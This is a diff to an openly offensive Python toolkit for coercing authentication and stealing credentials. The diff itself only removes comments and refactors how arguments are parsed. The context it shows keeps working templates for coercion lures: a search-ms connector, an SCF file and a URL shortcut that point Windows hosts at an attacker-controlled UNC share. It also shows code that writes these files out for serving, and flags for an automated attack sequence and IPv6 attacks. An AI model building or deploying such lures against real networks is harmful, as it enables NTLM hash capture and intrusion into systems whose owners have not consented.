@@ -17,7 +17,6 @@ logger = logging.getLogger(__name__)
 class CoerceTemplates:
     """Templates for authentication coercion"""
     
-    # WebDAV search connector template 
     SEARCH_MS = """<?xml version="1.0" encoding="UTF-8"?>
 <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
 <description>Microsoft Outlook</description>
@@ -32,20 +31,17 @@ class CoerceTemplates:
 </simpleLocation>
 </searchConnectorDescription>"""
 
-    # SCF file template
     SCF = """[Shell]
 Command=2
 IconFile=\\\\{server}\\share\\icon.ico
 [Taskbar]
 Command=ToggleDesktop"""
 
-    # URL shortcut template 
     URL = """[InternetShortcut]
 URL=file://{server}/share/
 IconFile=\\\\{server}\\share\\icon.ico
 IconIndex=1"""
 
-    # Print notification template
     PRINT = """<?xml version="1.0" encoding="UTF-8"?>
 <descendantfonts>
 <print>
@@ -76,7 +72,6 @@ class CredentialToolkit:
         web_dir = Path('web')
         web_dir.mkdir(exist_ok=True)
         
-        # Generate various coercion files
         files = {
             'search.search-ms': self.templates.SEARCH_MS,
             'share.scf': self.templates.SCF,
@@ -329,14 +324,15 @@ def parse_args():
     parser.add_argument("--auto", action="store_true", help="Enable automated attack sequence")
     parser.add_argument("--ipv6", action="store_true", help="Enable IPv6 attacks")
     
-    return parser.parse_args()
+    return parser
 
 def main():
     if os.geteuid():
         print(colored('[-] ', 'red') + 'Script must run as root')
         sys.exit(1)
 
-    args = parse_args()
+    parser = parse_args()
+    args = parser.parse_args()
     toolkit = CredentialToolkit(args)
 
     if args.auto:
